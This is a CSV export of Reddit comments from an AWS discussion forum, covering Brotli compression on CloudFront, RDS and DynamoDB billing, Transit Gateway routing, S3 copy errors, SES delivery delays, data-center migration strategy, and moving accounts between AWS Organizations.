g5esrg7,ithz5w,"Bro, do you even #AcceptEncoding=br?

Of CORS you do!",59.0
g5etw05,ithz5w,God what’s the max-age in here? Like 63072000?,11.0
g5f60n1,ithz5w,Accept: text/puns,6.0
g5ez1nh,ithz5w,"No, Bro is a network security monitor that has been evolving since about 1994.  Used in national labs supercomputer centers. 😎",3.0
g5fgdle,ithz5w,I think you mean Zeek,1.0
g5flc9q,ithz5w,Now it is Zeek but it was Bro for about 20yrs.,1.0
g5fw59a,ithz5w,Issa joke,1.0
g5ffq7o,ithz5w,I'm still waiting on AWS to enable Middle Out compression. I doubt Brotli gets a better Weissman score.,26.0
g5fwzoc,ithz5w,People would think your website is broken because it loaded too fast,1.0
g5exew7,ithz5w,"This is the first I’m hearing of Brotli compression(In any context), it’s kinda neat! 


https://en.wikipedia.org/wiki/Brotli",7.0
g5f0cyb,ithz5w,"Same here, but I hadn’t really considered it, but apparently it works very well and is fast even for large sequences.",2.0
g5fy1rc,ithz5w,"We had BR working on a non-cloudfront server and saw an average of ~10% improvement compared to gzip, which is pretty awesome considering how little effort is involved.",2.0
g5gy67j,ithz5w,There’s a lot of effort on your cpu. I wouldn’t recommend it for anything but static content.,1.0
g5fup5e,ithz5w,"Here’s another in the wild example. Really drops the size of tailwindcss files in web apps:


https://tailwindcss.com/docs/controlling-file-size

/u/PulseDialInternet FYI in case you care",2.0
g5ggsg4,ithz5w,Thanks,1.0
g5gdxzm,ithz5w,There's a Dragonball: Broly joke in here somewhere.  Something about power levels?  IDK,1.0
g6br1t2,ithz5w,Looks like this is not supported via CloudFormation [https://github.com/aws-cloudformation/aws-cloudformation-coverage-roadmap/issues/571#issuecomment-695965362](https://github.com/aws-cloudformation/aws-cloudformation-coverage-roadmap/issues/571#issuecomment-695965362),1.0
g81mwpn,ithz5w,confirming it does not work as of Oct 7th on us-east-1,1.0
g5g8h9m,ithz5w,Finally it catches up to the others,0.0
g5edzhs,ith3b3,OCR you can use Textract,1.0
g5eekd3,ith3b3,"Elasticsearch comes to mind, but it is fairly complex. If you want a full “platform” style thing it’s probably the most well known / supported tool for working with stupid big amounts of text.",1.0
g5fwn9i,ith3b3,"Kendra, though it’s a service that very much getting off the ground. That said, combined with Textract, it may be able to get you what you need ¯\_(ツ)_/¯",1.0
g5eav1s,itgjek,"You get charged for every hour your RDS instance is running. Doesn’t matter if it’s being used or not. Doesn’t matter what queries you run. You seem to be thinking of some sort of serverless billing model, but think of RDS as an extension to EC2.",8.0
g5eke15,itgjek,"Hello, thanks for the answer. I thought it was (idk the exact term) instantiated? so it stays in a sleep state (where I don't get charged) until I perform a request.",1.0
g5en7cg,itgjek,"You might be thinking of [Aurora Serverless](https://aws.amazon.com/rds/aurora/serverless/), which does work roughly how you describe.  Some of caveats though:

- Not technically MySQL, but fully compatible with MySQL.
- You don't choose an instance size (t3.micro), but instead pay per [""ACU""](https://aws.amazon.com/rds/aurora/pricing/).
- It can scale from zero, but will have a 30ish second cold start when it does.
- After scaling out, it won't immediately scale in, it'll wait for 10 or so minutes of no activity, and you'll pay for those 10 minutes.",2.0
g5elcsh,itgjek,"Maybe you should look at DynamoDB (not a traditional SQLDB), it has on-demand which offers pay-per-request pricing.

Many folks are stuck in the traditional DB world when they can actually move to DDB.",1.0
g5encxf,itgjek,"Ye, I was actually avoiding DynamoDB because I didn't want to learn NoSQL but I think it's time. It even comes with an always free tier which is amazing.",1.0
g5fia6g,itgjek,"No(t only) sql are data structure stores, versus generic tables.

- List&lt;T&gt; is SQS proving GetNext() access

- Dictionary&lt;Partition, Key, T&gt; is DynamoDB exposing GetItem(id), SetItem(id, value), GetItems(starts-with)

- etc.

Align the store with access pattern and everything is easy from there.",2.0
g5enhik,iteso8,Is there an AWS tool that do the inverse (text to speech)?,4.0
g5eo6ne,iteso8,Yes—Amazon Polly: https://aws.amazon.com/polly/,7.0
g5epohv,iteso8,Many thanks!,1.0
g5dolb8,itciui,"If objects are public, you can probably still make authenticated requests to them. Just make your own AWS account with permission to access S3--you should be able to use those credentials to access the bucket. (It is possible that the bucket has been set up to forbid authenticated requests but that seems unlikely. Also be warned that it is possible that your account could incur charges in some way.)",1.0
g5dr63v,itciui,Try using [https://github.com/peak/s5cmd](https://github.com/peak/s5cmd) instead of awscli.,1.0
g5e5g2e,itciui,I haven’t tested this but have you tried using generic access keys from your own account since they should essentially still have read access to the public bucket?,1.0
g5dj5qq,itb1y1,"Look into AWS Cloud Map, that's the right tool for the service discovery you need",1.0
g5dxjkd,itb1y1,"Are these containers on separate tasks, or the same task?",1.0
g5e1lnl,itb1y1,"If you're defining multiple containers in a single Task Definition, you can reference your container using its name the same way docker-compose works.
If they're in separate task definition, you can use VPC Service Discovery
https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ecs-service.html#cfn-ecs-service-serviceregistries

https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-servicediscovery-privatednsnamespace.html",1.0
g5e1zpc,itb1y1,"Using [ECS ComposeX](https://github.com/lambda-my-aws/ecs_composex) would allw you to deploy your services very easily with service discovery and appmesh if you fancy.
It will generate all the CFN templates you need for ECS + Fargate. You can deploy directly from the CLI too",1.0
g5fcrqn,itb1y1,"Others have provided answers to your questions. Out of curiosity, what’s the use case of putting a database in Fargate? Would you really want your database to be ephemeral?",1.0
g5d7zsr,it9vyx,"Across multiple Accounts? You need to use Resource Manager to attach the TGW in the same Region.

[https://aws.amazon.com/ram/](https://aws.amazon.com/ram/)",2.0
g5dftqj,it9vyx,Awesome! I guess RAM works only for accounts under same AWS Organization.,1.0
g5gjeax,it9vyx,It works across organizations as well.,1.0
g5gqp4m,it9vyx,RAM will work across Orgs. I use it all the time to attach TGW between Orgs/Accounts/VPCs.,1.0
g5de7e6,it9vyx,"You should have a direct connect gateway for each DX in its own account.

Each DXGW can connect to 3 transit gateways.  The TGW just needs to be shared to the account that has the DXGW.  So as long as you don’t need more than 3 TGWs you should be fine.",2.0
g5df6km,it9vyx,"Agreed. But the issue is not DXGW to TGW. 

Its DXGW-TGW Account A ------- DXGW-TGW Account B. (Same region)

TGW A --- TGW B (peering is not possible as same region) ISSUE",1.0
g5dib2w,it9vyx,"Correct, you can’t peer TGW in the same region. Your question made it sound like DX was the issue, not communicating between all the VPCs.

Your choices are: 

1) Consolidate to one TGW using TGW sharing and attach both DXGW to it.

2) create an intermediate VPC between the two TGWs.  This VPC will only serve as a routing point between the TGWs.   It has an attachment for each TGW.  The VPC route tables should point all traffic to the proper TGW attachment for the network ranges on each side.",1.0
g5djggl,it9vyx,Thanks for the in detail explanation. u/badoopbadoopbadoop I will give both a shot.,1.0
g5dku3i,it9vyx,"How about DXGW to TGW.  Then, attach the VPCs you need to that TGW.  (VPCs can attach to multiple TGWs).",1.0
g5dksh7,it9vyx,Maybe setup a VPN connection between the two VPCs,0.0
g5cxhi8,it9n8r,"hi guys, i fixed it myself",14.0
g5dmj6h,it9n8r,You might post the solution as well 😜,11.0
g5dngwc,it9n8r,"1.Created internet gateway
2.Attached it to Default vpc
3.Edited routes in route table (add routes of igw)
&amp; You are good to go",5.0
g5f3qf7,it9n8r,"Side-note: this is a the best way to learn AWS (or any tech really)... break something unintentionally, then bash away at the keyboard until you figure out a solution.",3.0
g5d5587,it9n8r,Noice,1.0
g5deau4,it9n8r,U wot m8? Denver coder 9?,0.0
g5ezhrv,it9n8r,"I believe there is a very specific aws cli command to bring up a brand new default vpc. You just need to completely delete the original one.

It's good for turning and burning when you are practicing. It's somewhere in the docs!

Edit: here you go, found it.

https://docs.aws.amazon.com/cli/latest/reference/ec2/create-default-vpc.html

Edit 2: practice creating a lambda in a vpc and making some vpc endpoints. Just follow the docs, its not hard, but people trip up on it all the time.",2.0
g5d64ku,it99nc,"Don't know much about Terraform, but AWS CDK writes Cloudformation out, could you take the Cloudformation and convert that to Terraform using something like this CLI?

[https://github.com/humanmade/cf-to-tf](https://github.com/humanmade/cf-to-tf)",5.0
g5fz7fu,it99nc,"There is a version of the CDK that writes terraform out as well. https://aws.amazon.com/blogs/developer/introducing-the-cloud-development-kit-for-terraform-preview/

I think what OP is asking is if you can take a CF CDK script and convert it to a TF CDK script, which you can't directly as the init process sets up a bunch of CF/TF specific things, but you can likely reuse a lot of a code between the two.",1.0
g5gbr57,it99nc,"Correct, that is what I was looking at but it wasn’t obvious.",1.0
g5gbuhi,it99nc,"That might work, you’re correct when you synth it outputs Cf, ill look into this more. Thanks!",1.0
g5d5aps,it99nc,"You cannot -- the libraries used are different based on the underlying provisioning system.

If it's a small app, I generally find the interfaces of the resources relatively easy to move but anything decently sized is a hand-migration.",3.0
g5e329x,it99nc,"If you are not married to the CDK workflow, I'd suggest you just try writing some Terraform by hand. I think it's much easier than CF to write by hand, as it's not as verbose, and the [docs](https://registry.terraform.io/providers/hashicorp/aws/latest/docs) are pretty good (at least for AWS). Plus every resource page (e.g., [elbv2](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb)) has a snippet you can copy to start with.

You can also use a tool like [terraformer](https://github.com/GoogleCloudPlatform/terraformer) to export some resources to Terraform to help you get started.

People always harp on the fact that Terraform uses a ""proprietary"" language, but it's just a declarative language that's practically JSON with slightly different syntax, some built-in functions, and variable interpolation. (edit - and comments!)",2.0
g5f2xqg,it99nc,Yeah how dare hashicorp support comments in json. They should have stuck to the insanely readable ruby syntax like what is used in vagrant. (heavy sarcasm!),2.0
g5gbi73,it99nc,"I've used a similar tactic when wanting to get away from CloudFront, where I just import resources into Terraform.",1.0
g5gbkye,it99nc,"I see what you mean, my concern was really using terraform. If I write terraform, I’m stuck in terraform, which I’d seen others comment about. Not knocking terraform, but something I need to consider. 

I figured if I took AWS cdk or Cf I could rip it through terraform somehow, which meant I could leverage my exisiting code rather than rewrite.",1.0
g5dmebe,it99nc,"Terraform, specifically the aws provider doesn’t use cloud formation to bring up its infrastructure instead it uses the cli which allows it to have access to service features much faster than cloud formation since aws is a cli first provider.",2.0
g5dkc89,it99nc,"They are different use cases. CDK is actual infra as code (python JavaScript etc). While Terraform uses their own template with proprietary notation. Terraform has CLI tools and there are example templates you can download and tweak for your use case. For Sysadmins Terraform is typically the go to, especially if you don’t have have a  programming background. Cloud formation is powerful but has a higher learning curve. Also checkout Pulumi which is an alternative to CDK.",1.0
g5gbnwf,it99nc,"I did check out pulumi, oddly it seems like more of a learning curve, I like the product idea in general though.",1.0
g5h8rf3,it99nc,"Pulumi advertises as cross platform or multi cloud. For AWS specific I would recommend CDK. Bigger community, better support.",1.0
g5cukgy,it8ete,I'd open a support ticket to AWS to have an engineer see what the details are about that code.,10.0
g5dn19m,it8ete,This is purely anecdotal but I've been seeing a much higher s3 multipartcopy error rate recently. I have a script that I've been running a couple times a week for \~3 years and I recently had to increase  retries and exponential backoff.,2.0
g5dqb7z,it8ete,"Anecdotally - ME TOO.

We've never had SO many jobs failing. It hasn't just been copy from Restored state to Standard, but also copying from Standard to Glacier.

It's been smooth for months and now we're seeing all kinds manual intervention being required.

Any thought on whether your increased error rate started showing up around August 21st?",3.0
g5fv7gj,it8ete,"I have automation that enforces baseline IAM configs running every hour. It’s been in place for a couple years with no problems. Starting around early August, that automation began to fail constantly and I had to add retries to every step. It consistently has to retry ~5 times before succeeding.",2.0
g5drv5h,it8ete,"Looking at my git history, I see I added more retries and exponential backoff to that script July 9th.",1.0
g5dn74t,it8ete,"1. Check your encryption at rest for standard storage.
2. What method you use for multi part copy? I would suggest to use s3 resource copy (boto3) CLI.",1.0
g5fcp2q,it8ete,"How was the data uploaded in the first place?

I know multipart uploads are a max of 4GB I think. Is it possible that the data was uploaded in chucks?

If yes, you might need to download all the chucks and concatenate them",1.0
g5co80j,it80r5,"I had some users complaining about that, I think the messages were delivered after some time",1.0
g5cr703,it80r5,"Mine are never getting delivered.  I am getting:   


An error occurred while trying to deliver the mail to the following recipients:",1.0
g5d2d2r,it80r5,"If you just set up the account or ses as you noted, you have to whitelist the email addresses you send to.  You need to open a ticket with aws to get full use without whitelisting the send to email addresses.   You can find more details in their docs.",1.0
g5ez5fx,it80r5,I moved it to production last night.  It seems the emails to [outlook.com](https://outlook.com) are just delayed by like 6 hours.  Very odd.,1.0
g5fx6p8,it80r5,Could [outlook.com](https://outlook.com) be doing [greylisting](https://en.wikipedia.org/wiki/Greylisting_(email))? On my previous job we used SES and most of the delivery problems were with outlook.com.,1.0
g5gmwvd,it80r5,"I am surprised I have had this many issues with SES.  You would think the quality would match some of the other AWS services.  But then again, offering a mail relay to send whatever you want is probably a huge headache for AWS engineers.  


I am seeing delivery times speeding up now.  My other guess is that [outlook.com](https://outlook.com) was caching SPF records longer than my TTL.  I had my SPF to hard fail all.  But even that would still get it to Junk.  Who knows.  Thanks all for your replys and help!",1.0
g5cx9yj,it7fdu,Lift and shift makes sense to evacuate a datacenter quickly. Then refactor/replatform in the cloud when you have some breathing room. Vmware on AWS makes sense here too.,24.0
g5efgq2,it7fdu,"Im surprised by this (vmware makes sense at all) but we are learning this now. Exit datacenter with srm or something, ditch all your hardware and datacenter, then cloud native it from your vmware ‘datacenter’",3.0
g5ei4z9,it7fdu,"Both lift + shift and VMware on AWS are ""exit datacenter immediately"" solutions.",2.0
g5ek4yc,it7fdu,"I know, I’m just surprised vmware is a viable thing for any reason in 2020. 

Lift and shift is pretty horrible. 

‘Lift and light transform to rds for database and implement IAC and config management’ is a doable thing, but straight mass migration of existing stuff using something like cloud ensure, I am massively not a fan. 

vmware makes more sense to me for this.",1.0
g5emjfb,it7fdu,"If there is a looming deadline or pending DC or Colo lease expiration, leadership will do what is needed and then ""fix"" workloads later. I'm not saying don't replatform or refactor at all, but there are sometimes multi million dollar penalties to avoid now.",1.0
g5cxqn9,it7fdu,Ditch out those consultants and get yourself a decent AWS Consulting Partner with Migration competency.,18.0
g5d3faw,it7fdu,"We had one in our company, he cost us an arm and leg but well worth it. Make sure that “teaching existing staff” is part of his role and responsibilities as well.",9.0
g5em97r,it7fdu,"Standard Disclaimer: I am *a* consultant at AWS. I am not *your* consultant 🙂.  My opinions are my own. 

In cases like this, we would also usually suggest that you do the quickest lift and shift that you can and then worry about being “cloud native”. 

We call it “re-hosting”. 


https://aws.amazon.com/blogs/enterprise-strategy/6-strategies-for-migrating-applications-to-the-cloud/",8.0
g5d0a1z,it7fdu,"I wish it was that simple. I do not ""own"" the apps, and cannot blame those departments for trying to make sure that their services work after migration, thus engaging highly specialized apps consultants. As it happens, a lot of those have no native cloud knowledge...",1.0
g5d4bgu,it7fdu,"&gt; As it happens, a lot of those have no native cloud knowledge...

So, they're the wrong people for the job. You wouldn't get legal advice from a doctor, or ask a real estate lawyer to help with your taxes.",10.0
g5d2v3b,it7fdu,"Than bring this up to the C-levels, that those specialized app consultants have no cloud knowledge and it will cost you more in the long run with just lift-and-shift",2.0
g5dqzc1,it7fdu,"In the company I work right now, we have a complete team of solution architects and engineers from AWS that are supposed to help us migrate. But our top management decided we need to move asap to AWS, and to reach the personal goals of the IT boss, lift&amp;shift is the only option. 

So even though the guys admit over a coffee that it's stupid, they'll still do what their customer pays them for.",1.0
g5crvzt,it7fdu,"Sounds like you are trying to side-step having to have the domain knowledge of your current processes, and somehow get it into the cloud.  I'm not sure that's going to work out of the box with little to no pain.

I will say that I've heard that a naive lift and shift can become horribly expensive i.e (not using cloud native offerings when available), so keep that in mind.",27.0
g5ddh8u,it7fdu,"It's expensive at first....but then you get all those juicy ""we saved X dollars by moving this lame ass script from ec2 to lambda"" bulletpoints when it comes time for personal reviews.",13.0
g5lod0h,it7fdu,"The catch to this is if you don't already have awareness of how to use Lambda, then you're just letting your onsite infrastructure collect dust while racking up a huge cloud bill.  
My advice would be to do this kind of thing gradually, and in a way that makes sense from the perspective of business logic. Let the stuff you bought already live out its lifecycle and work on adapting to Cloud technologies in the interim. AWS wants you to L&amp;S because it means they'll make more money off the compute that you technically already own.",1.0
g5cp78h,it7fdu,"the ""tool"" is your brain and knowledge of your architecture and workload, and AWS's catalog",8.0
g5cpx53,it7fdu,be the tool you want to see in the world,11.0
g5d7qiq,it7fdu,"*raises hand*
 
Hey, I'm a tool!",3.0
g5dou4o,it7fdu,"See the tool, be the tool.

-Ty Webb",2.0
g5d0kdg,it7fdu,"i'd recommend lift-and-shift, and once you are fully migrated then you can proceed to make the apps cloud native. you won't be under as tight of a time constraint (sacrificing decisions) and you will have the flexibility of the cloud for migrating from legacy to cloud native apps.",8.0
g5dbmwd,it7fdu,"I believe we are in a similar situation as you. We're an infrastructure team, and the CIO wants to ""cost optimize"" by moving ""80% of our applications on AWS by the end of the year"".

We hired a very good AWS consultant and built out the bones of the cloud infrastructure (VPCs, networking, security, etc.) according to best practices on AWS. Even though we're a Microsoft centric organization and would save more money with Azure because of our Enterprise Agreement and Azure Hybrid Benefit.

When it came time to actually migrate applications, we lifted and shifted some application servers to AWS, got the servers online, then quickly found out the ""application owners"" know very little about the the technical workings of their applications. Granted, they are commercial software applications rather than in house developed, but they didn't even know where to go in their application's administrative settings to update where their applications pointed (DB, SMTP, URLs, etc.). So that meant they had to reach out to their application support and get them involved. Who may or may not assist with the migration as part of support or for cost as a ""project"".

So far we have two applications on AWS. Thankfully, the AWS consultant understands what is happening and has backed us up to management and insisted that the application owners are the ones that need to be doing the work and coordinating with the vendors, not just us. Also, the application owners should be the ones to prioritize which applications go in which order, not us as originally requested, since they know their workload, schedule, and which applications are slated for upgrades/migrations/replacements. So naturally, the project is at a standstill because the application owners don't have time for that.

As for tools, there are tools such as CloudChomp that can analyze which servers communicate with each other, but they won't be able to identify which settings or where in the proprietary applications that settings will need to be changed/updated in order for them to work. If things were setup properly, and everything uses DNS, it might be as simple as updating DNS records to the new IPs. In our case, they used IPs for everything so we had to have the vendor find them and update them (to DNS names) for the applications to work.

I think what people (especially management) needs to understand, is that when someone is talking about ""application(s)"" in relation to Cloud, 99% of the time they aren't referring to commercial off the shelf applications, they are talking about applications developed by the organization, which typically have the in house developers that can understand and support a migration, optimization, or build out in the cloud.

Hope that helps.",4.0
g5dimgk,it7fdu,"Thank you, for the clear explanation. Pragmatic approach to migration is to understand/profile the applications by respective owners.",2.0
g5dxatf,it7fdu,How to triple your bill in one easy step.,4.0
g5d13zo,it7fdu,What you’re really wanting is a cloud solution architect,3.0
g5dmq93,it7fdu,"This is scary, hard deadline (red flag) and app owners not knowing how their apps work in terms of infra / networking / dependencies.

Besides agreeing with all the advice given, just a couple thoughts: 

A good test to see how “cloud ready” (or any migration in a good automated way) an app is is to copy the data and destroy everything (ok, in a mirrored environment), now reproduce it from scratch. Ideally regardless of cloud this should be done quickly and mostly automatically (DR anyone?). If you have infra as code you won’t trip over manually set hard coded stuff and things like that. 

An important idea is that besides the technology, people are going to be affected. There will need to be training, some people change roles etc. If not right away, later on (for ex a DBA who was babysitting a db server, after it’s moved to AWS RDS can use her time now on other things).

Extra thought: think about security, accounts and privileges early on.",3.0
g5dtohb,it7fdu,"I think a lot of people here have given you good advice, and you’re certainly going to face some challenges.  

Working at AWS, one thing that I see with customers in this situation is “Lift &amp; Shift now, then we’ll refactor later”.  It certainly is a quick way to move, but they tend to do the first half with like-for-like Instances (matching On-Prem CPU &amp; RAM) and forget the second part altogether.  A year later the CEO will be shocked that “Cloud migration” didn’t make your company agile and transform you into a market leader, and worse, the cost-savings aren’t there.

The key to success in this case is to ensure a couple of things: 
1.	Instance Sizing - Ensure teams size their instances realistically. It doesn’t matter which tool you use, but get at least CPU &amp; RAM utilisation metrics, and size your EC2 Instances on those, not the specs of the on-prem systems. 
2.	Monitoring - Once moved, monitor the hell out of that stuff. If instance usage is under 50%, resize. You can use CloudWatch in it’s basic form for peanuts, or get very detailed with either CloudWatch or an external tool like DataDog.
3.	Deadlines - Teams will *say* it’s easy to refactor, and then the pressure will switch to something else.  Ensure management have strict deadlines and enforce them.

These are some ramblings from me about the Lift &amp; Shift side. It’s not easy.  One thing that you might not have thought of which could move quicker -IFF your on-prem systems are VMWare... You can use VMWare on AWS and basically just move the VMs straight into the cloud. Would minimise required reconfiguration and installation work.  Has a cost of course, and only possible if you actually use VMWare now.. but worth suggesting.",3.0
g5erlhs,it7fdu,"VMWare is in use, and its usage in AWS has been a cost barrier, for sure, but I'm hearing that VMWare is ready (!?!) to offer more options and incentives. Haven't had the chance to verify, yet, but the likes of Cisco UCM, Cisco ISE, Bluecoat proxies management, etc. definitely present themselves as opportunities/challenges, considering the alternative, which is to try and find a co-lo somewhere for all VMs of products whose  vendors do not offer alternatives for AWS hypervisors.",1.0
g5cu3u0,it7fdu,"Haven't used it, but i recall seeing this:

[https://aws.amazon.com/migration-evaluator/features/](https://aws.amazon.com/migration-evaluator/features/)

I suspect it won't magically re-architect your workloads as others have suggested but the link does mention migration experts so they might have some insight into how to tackle it.

I think you're spot on with the cloud native question, but you'll need to consider the cost of re-architecting, retesting etc. It might be a case of lift and shift to get it done, decomm what you can and new workloads are cloud native moving forward. Eventually drawing down your vm's.",2.0
g5dordu,it7fdu,"To add to the pile of stuff you need to deal with.

Think about how you want to capture costs in AWS -- accounts vs. tags or a hybrid.  (hint: you want accounts).  Learn AWS Organizations and Control Tower -- figure out how you want to organize accounts into Organizational Units (OUs) for both management at scale and capturing costs by LOB/Service/Product, service control policies, guardrails, whether or not you want to use account factory, what your audit requirements are, AWS Config conformance packs that will be useful, etc.

Work this stuff out in advance, configure the services to support your requirements and build account automation mechanisms from the get go.  Your world will be much more manageable when you're at scale.

Disclosure: I spend a lot of time on cost and governance in AWS - it is my personal bias and I own that bias.",2.0
g5dvby4,it7fdu,What is wrong with a hybrid approach? I'm just curious.,3.0
g5f6zy4,it7fdu,"Nothing wrong with it at all.  Managing tags well is a lot harder than you'd think it should be.  Plus, as you know, not everything is tagable.",1.0
g5fo671,it7fdu,What are your top two services you'd like to see support tags?,3.0
g5gkt37,it7fdu,"Personally, I'd like the ability to have a service control policy that allows engineering to establish default user tags.  For example, for all EC2s in US-East Ohio - 3 have a default tag of cost-center that has a domain value of '1234'.  Every EC2 that gets instantiated in that AZ within that region have that tag applied and it can't be removed.

To answer your question directly - Data Transfer.  Having a simple method to distribute DT costs at a product level would be amazing.  I don't know how it would be accomplished, but it would solve some back end accounting and financial management issues.",2.0
g5gl82c,it7fdu,"If you could associate a CloudWatch metric costs to the resource being monitored - that would be super. If that resource has a tag, the metric usage (in the CUR) would inherit the tag so you could work toward building a total cost of operation for that resource.  It would only need to appear in the CUR and it could be built with some post processing as the CUR is being developed so there is no impairment of real-time operations.

IIRC, only CW alarms are only currently taggable.",1.0
g5de32l,it7fdu,"I don't think such a tool exists, this will come down to knowledge of the apps, how they're wired and how that translates to AWS.  You may need to just bite the bullet and do the lift-and-shift...and just be prepared for sticker-shock.  As someone else mentioned it's going to cost a lot to do it this way...likely more than your paying for the DC.

After the initial L&amp;S, you can then begin going app-by-app and figuring out ways to be more cloud-centric and saving money.

Others mentioned an AWS solutions architect or similar...that's a good idea, as they'll know the AWS tools and will have seen a lot of compute patterns that have moved to the cloud in the past.",1.0
g5eb13o,it7fdu,"Lift and shift first and then refactor later is a perfectly valid approach if your primary constraint is time. The downside being your overall time to get to using some cloud native features is longer. 

Just don’t get complacent and leave stuff there. Figure out a plan to start working on refactoring straight away. Even the low hanging fruit can provide some big benefits. For example don’t run your db servers inside instances move it out to rds or suchlike. That can be done with the most minimal of changes to app code to report the endpoint.",1.0
g5emm25,it7fdu,"Standard Disclaimer: I am a consultant at AWS. My opinions are my own. I am *a* consultant.  I am not *your* consultant 🙂.

Migration Strategies:  https://aws.amazon.com/blogs/enterprise-strategy/6-strategies-for-migrating-applications-to-the-cloud/

Cloud Adoption Framework: https://aws.amazon.com/professional-services/CAF/",1.0
g5cu5yj,it7lmm,"Put CloudFront in front of the S3 Bucket. Not only the transfer out from CloudFront is much cheaper in most regions, your content can be cached too.",12.0
g5dim7y,it7lmm,"Thank you! We are using CloudFront, but the price is still quite high. To be honest I am not very happy with the delivery speed either. 

I guess CDN works best with light files, that indeed can be easily charged, but that's not the case",1.0
g5e2hbt,it7lmm,Delivery speed is probably poor since the bucket is in another region than the user. Can't fix light of speed,3.0
g5ebm05,it7lmm,"Exactly! That's why I was thinking of storing my data with a geo-distributed storage provider in 3 regions +CDN. Although, feel insecure to fully move from AWS to the new cloud provider. Do you think it could work?",1.0
g5ecjvz,it7lmm,I would give juce a go. If it actually works and you have the revenue to justify the cost it is going to save you a lot of trouble.,2.0
g5ed8ni,it7lmm,Thanks for the follow-up! I think I will actually try it.,1.0
g5cp4xi,it7lmm,"Reset S3 VPC endpoints? That would cut bill for the backups, helped us to save a lot..   €1800/m sounds good though, I don't think it would be cheaper with other cloud, but I'd check with DO as well.

That's funny because I keep getting promotions from Juce ([https://juce.cloud/](https://juce.cloud/)), would be interested in the review too. Let me know if there are any updates. The project seems to be quite fresh, I wouldn't worry about reviews absence much for now. It's only suspicious when the company is 5+years on the market and has no info IMHO",1.0
g5d9k4e,it7lmm,"Yeah, backups is not the issue here, thanks. I was thinking to try geo-distributed storage, since it looks very promissing to me. With DO I would be paying more since I want to store a few copies in different regions.",0.0
g5clkb8,it7u86,"I can't remember, but doesn't this go through API Gateway?

If so, are you deploying through cloudformation?",1.0
g5cmxax,it7u86,Yeah it does and no I'm just using the console.,1.0
g5cqr8r,it7u86,"This may help you get to the right path: https://docs.aws.amazon.com/apigateway/latest/developerguide/api-gateway-integration-settings-integration-response.html

Basically the output format needs to be mapped to the gateway as k/v's or to the header for content type.",1.0
g5cxw1h,it7u86,"""the output format needs to be mapped"" where is this in the console? It seems so strange that it doesn't like one particular script. it starts with ""use strict""; unlike the other scripts that work.",1.0
g5d0tnv,it7u86,"[https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-gateway-response-using-the-console.html](https://docs.aws.amazon.com/apigateway/latest/developerguide/set-up-gateway-response-using-the-console.html)

&amp;#x200B;

Your lambda in particular looks to be returning a full js file instead of a json object or text? Depending on whether you are using a framework or not - the lambda-gateway integration has a handful of options on how to modify outgoing formats. The one I've used in the past were like a nesting-doll, drop my data into a \`{body: &lt;&gt;}\` value and tweak the response types, cache, etc with additional header-mapping values: \`{headers: &lt;&gt;}\`. My case, in which I was working with cloudformation, my lambda was responding with an XML doc.",1.0
g5cyc46,it6rmw,"At the end of 2019 they changed the way they cap the number of instances you can run from a flat number to a floating number based on how many cpus you are using. So like, you can't just buy up all the CPU power for an hour and destroy aws.   


But they are fairly loosey goosey about it. They kinda let you push the edges. If you contact them they will raise your limits but they also sort of let you scrape the edges knowing that if you go 5% above you are just expanding and not doing some plot to DDOS all of amazon.",2.0
g5cykd3,it6rmw,"EC2 instance limits have changed last year: https://cloudsoft.io/aws-ec2-on-demand-instance-limits-advice-on-changes/

Check your limits and supply a limit increase.",1.0
g5d7oqv,it6fe9,"Before AWS Organizations I had to enable it all manually. We have over 20 Accounts! I would suggest SCPs to restrict Regions so you have fewer to configure. I did this with AWS CLI from my Mac. 

Just curious why you can't do this at the Org level. Is your tenancy part of a larger Organization with multiple companies?",1.0
g68ntyn,it6fe9,"My current understanding (backed by [https://www.chrisfarris.com/post/multi-account-config/](https://www.chrisfarris.com/post/multi-account-config/)) is that you can deploy Config rules centrally from the organization master account (or a delegated admin account for AWS Config, c.f. [https://aws.amazon.com/blogs/mt/deploy-aws-config-rules-and-conformance-packs-using-a-delegated-admin/](https://aws.amazon.com/blogs/mt/deploy-aws-config-rules-and-conformance-packs-using-a-delegated-admin/)), but you still need to deploy 1 configuration recorder per region for every account... I would be super happy if someone proved me wrong.",1.0
g5cdryt,it5opb,"You can just move the accounts from one org under the other org. You can do this in 5 minutes in the ui in the AWS organisations console.

This will also move all the billing for those accounts into the new org account.",6.0
g5cm89c,it5opb,"just a note, you WILL need a credit card to move accounts. This is officially from AWS support.

whether it takes 1 minute or 1 seconds to transfer/move to another organisation, it doesn’t matter.",3.0
g5ecpy6,it5opb,"I honestly don't remember needing a credit card? You just remove the account from the old org account and invite the account to join org through the organisation console. 

This is assuming that you were already paying for the accounts in the centralised account, not the individual accounts.",1.0
g5fjy0p,it5opb,that account then had the credit card already,1.0
g5ceij2,it5opb,This is the correct answer.,2.0
g5cf3bw,it5opb,"Thanks for a swift response.

Went to organization but given that the account I need to move is the master account the \`Remove\` button is greyed out.

And this piece of AWS documentation that I just found is showing me that moving master account can only be done through AWS Technical Support?

1. Sign in to the [AWS Management Console](https://aws.amazon.com/console/) as the root user.
2. Open the [AWS Support Center](https://console.aws.amazon.com/support).
3. Choose **Create case**.
4. Enter the details of your case: Choose **Account and billing support**. For **Type**, choose **Account**. For **Category**, choose **Ownership Transfer**. For all other fields, enter the details for your case.
5. For **Preferred contact language**, choose your preferred language.
6. For **Contact methods**, choose your preferred contact method.
7. Choose **Submit**.

[https://aws.amazon.com/premiumsupport/knowledge-center/transfer-aws-account/](https://aws.amazon.com/premiumsupport/knowledge-center/transfer-aws-account/)

Am I correct on that?",1.0
g5cgs3v,it5opb,Ideally you shouldn't have anything in the master account that should be transferred to the other org. Would it be possible to re-deploy those things in a sub account in the new org?,2.0
g5ci038,it5opb,"Do you really need to move the master account?

Usually they have nothing in them and are just used for centralised billing (and maybe some compliance things like scp's)?

When we did it, we just abandoned the old master account which had no resources anyway..",2.0
g5cmohl,it5opb,Sometimes AWS credits are tied to a master account. So they may not be able to take advantage of the credits in the second master.,2.0
g5cqdvm,it5opb,"The master for the old organization needs to have all member accounts moved to the new organization first.  Once that is done, remove the organization for the old master and you can make it a member of the new organization.",2.0
g5cm7g2,it5opb,"just a note, you WILL need a credit card to move accounts. This is officially from AWS support.

whether it takes 1 minute or 1 seconds to transfer/move to another organisation, it doesn’t matter.",2.0
